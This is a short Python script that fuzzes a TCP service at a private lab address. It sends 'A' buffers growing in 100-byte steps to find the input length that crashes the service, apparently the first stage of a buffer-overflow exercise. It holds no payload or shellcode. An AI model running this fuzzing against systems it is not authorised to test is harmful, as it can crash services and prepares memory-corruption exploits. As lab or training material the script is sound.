#!/usr/bin/python3

import socket, time, sys

ip = "192.168.13.135"
port = 42424
timeout = 5

buffer = []
counter = 100
while len(buffer) < 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        print(f"Fuzzing with {len(string)} bytes")
        s.send((string + "\r\n").encode())
        data = s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
